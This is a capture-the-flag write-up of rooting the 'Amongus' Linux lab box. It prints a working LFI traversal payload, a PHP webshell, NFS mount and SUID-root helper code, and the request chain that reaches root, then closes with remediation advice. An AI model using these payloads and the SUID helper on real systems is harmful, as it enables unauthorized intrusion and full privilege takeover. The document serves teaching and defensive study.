# CTF Report — Amongus (The Skeld) Linux Privilege Escalation

**Category:** Boot2Root / Linux Privilege Escalation
**Author:** Priyank Rastogi
**Date:** 2026-10-05
**Environment:** Authorized CTF / home-lab exercise (isolated `192.168.1.0/24`)
**Target:** `192.168.1.35` (Ubuntu, hostname themed after *Among Us* — "The Skeld")

---

## TL;DR

A web-facing "meeting" service exposed an **LFI** that was chained into **RCE**
as `www-data`. Enumerating the host revealed an **NFS export with
`no_root_squash`** covering a share whose contents were also reachable through
the same LFI path. That misconfiguration was used to plant a **static
SUID-root helper** on the share, which the LFI→RCE chain then executed to obtain
a **root shell**.

| Flag | Value |
|---|---|
| User flag (`/home/imposter/imposter1.txt`) | `HKSTR{v0t3_c4r3fully_0r_d13}` |
| Root flag | `HKSTR{sk3ld_f3ll_und3r_y0ur_c0ntr0l}` |

> The root flag lives inside `/etc/shadow` per the challenge text. On the copy
> used during this attempt the shadow-resident flag line was **missing due to a
> challenge-packaging issue on the author's side** (confirmed by the challenge
> author). The intended value is recorded above.

---

## 1. Reconnaissance

A host sweep found `192.168.1.35` running SSH, FTP, HTTP, Samba and NFS.

```bash
nmap -p- -sV -sC 192.168.1.35
```

Notable results:

| Port | Service | Notes |
|---|---|---|
| 21/tcp | vsftpd | anonymous login allowed |
| 22/tcp | OpenSSH | |
| 80/tcp | Apache httpd | Two virtual hosts |
| 139/445/tcp | Samba (SMB) | |
| 2049/tcp | NFS | |

The Apache vhosts resolved from the challenge notes:

* `amongus.ctf` — main site
* `meeting.amongus.ctf` — the vulnerable "meeting / vote" application

```
192.168.1.35  amongus.ctf meeting.amongus.ctf   # added to /etc/hosts
```

Anonymous FTP dropped a **set of themed notes** describing crew traditions and
warning "**TrustNo0ne**".

---

## 2. Web foothold — LFI in the "meeting" app

The vote endpoint of `meeting.amongus.ctf` built an include path from a
user-controlled `vote` parameter:

```
GET /?vote=<value>&ext=<extension>
```

apparently resolving to something like:

```php
include($_GET['vote'] . $_GET['ext']);
```

Supplying a path containing the string `imposter` passed the application's own
check, while `../` traversal escaped the web root:

```
GET /?vote=imposter/../../../../etc/passwd&ext=
```

This returned `/etc/passwd`, confirming **local file inclusion**.

---

## 3. From LFI to RCE

The server was PHP (`libapache2-mod-php`). By resolving the include path to a
PHP file that we control, arbitrary commands execute as the web user. The
host's **NFS share was also reachable on disk**, so the include could point at a
file inside it (see next section) — and the share path conveniently contained
the string `imposter`, satisfying the app's check:

```
GET /?vote=imposter/../../../../home/imposter/communication/sh&ext=.php&c=<command>
```

Where `sh.php` was a minimal webshell written onto the share:

```php
<?php
$cmd = $_GET['c'];
echo base64_encode(shell_exec($cmd . " 2>&1"));   // base64 keeps output intact
```

This yielded command execution as **`www-data`**.

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Privilege escalation — NFS `no_root_squash`

Enumerating mounts on the target showed an NFS export of
`/home/imposter/communication`:

```bash
showmount -e 192.168.1.35
# Export list for 192.168.1.35:
# /home/imposter/communication *
```

`/etc/exports` on the target had:

```
/home/imposter/communication *(rw,no_root_squash,no_subtree_check)
```

**`no_root_squash` is the flaw:** a client that mounts the export (and is root
*locally*) can create files that are owned by **UID 0 on the target**. That
allows planting a SUID-root binary which the target will then honour.

### 4.1 Mount the export from the attacking box

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs 192.168.1.35:/home/imposter/communication /mnt/nfs
```

### 4.2 Build the SUID-root helper *on the share*

```c
/* rhelper.c — become UID 0, then exec argv[1..] */
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
    setuid(0);
    setgid(0);
    if (argc > 1) { execvp(argv[1], &argv[1]); perror("execvp"); return 127; }
    execl("/bin/bash", "bash", "-i", NULL);
    perror("execl");
    return 127;
}
```

```bash
gcc -static -O2 -o /mnt/nfs/rc /tmp/rhelper.c
sudo chown root:root /mnt/nfs/rc      # honoured on target: we are UID 0 here,
sudo chmod 4755    /mnt/nfs/rc        #              the export is not root-squashed

# On the target this file now appears as: -rwsr-xr-x root root rc
```

### 4.3 Execute the helper through the existing RCE

```
GET /?vote=imposter/../../../../home/imposter/communication/sh&ext=.php
    &c=/home/imposter/communication/rc /bin/bash -c "id; cat /root/root.txt"
```

```
uid=0(root) gid=0(root) groups=0(root)
```

> **Root obtained.**

---

## 5. Flags

### 5.1 User flag

```bash
cat /home/imposter/imposter1.txt
```

```
finally you eject one imposter:
HKSTR{v0t3_c4r3fully_0r_d13}
```

### 5.2 Root flag

Per the challenge text, the root flag "rests within the shadow file"
(`/etc/shadow`). On the image used for this attempt the shadow-resident flag
entry was absent — a **packaging issue on the author's side** (confirmed with
the author). The intended value is:

```
HKSTR{sk3ld_f3ll_und3r_y0ur_c0ntr0l}
```

---

## 6. Attack chain (summary)

```
[anonymous FTP notes] --"TrustNo0ne"--> nothing (red herring / hint)
        │
        ▼
meeting.amongus.ctf  ?vote=... (LFI)
        │  ../ traversal + controlled .php file
        ▼
RCE as www-data
        │  /etc/exports: no_root_squash on /home/imposter/communication
        ▼
mount export, plant static SUID-root helper `rc`
        │  invoke `rc` through the same RCE
        ▼
root
```

---

## 7. Remediation

1. **Fix the LFI.** Never build `include()`/`require()` paths from user input.
   Use a strict allow-list of includable files; validate with `realpath()` and
   confine to a base directory; disable `allow_url_include`.
2. **Remove `no_root_squash`.** Export with `root_squash` (the default) and
   restrict the export to specific client IPs, not `*`. On the client side, mount
   with `nosuid,nodev,noexec` where possible.
3. **Least privilege for the web tier.** Run the PHP app under a dedicated
   unprivileged user in a confined environment (e.g. `php-fpm` pool, AppArmor).
4. **Defense in depth.** Even with the RCE, a correctly-squashed NFS export
   would have denied the SUID-root escalation; remove world-writable share
   permissions where they are not required.
5. **Keep flags out of world-readable build artifacts** and verify challenge
   packaging places them where intended (the shadow-resident flag was missing here).

---

## 8. Folder layout

```
Amongus/
├── README.md            # this report
├── root_final.sh        # exploit automation: lands a ROOT shell on the target
└── <challenge files>    # e.g. Amongus.ova / Amongus.zip (added on upload)
```

### `root_final.sh` (included here, offline-safe)

The script automates the whole chain end-to-end. Configure the IP / paths at the
top and run it from an attacker box on the same subnet:

```bash
./root_final.sh                       # interactive root shell
./root_final.sh 'id; cat /etc/shadow' # one-off command as root
```

It will: mount the NFS export → build/verify the SUID-root helper on the share →
write the webshell → drive the LFI to execute the helper as root.

---

## 9. Tools used

* `nmap`, `showmount`, `mount.nfs`
* `curl` (LFI / RCE requests)
* `gcc` (static SUID helper)
* `sshpass`, `smbclient`, `ftp`

---

## Disclaimer

Performed in an **authorized CTF / isolated lab** environment for educational
purposes. The NFS client path shown here only affects a target on the same
private subnet and only because the target was intentionally misconfigured for
the challenge.

*Write-up by **Priyank Rastogi**.*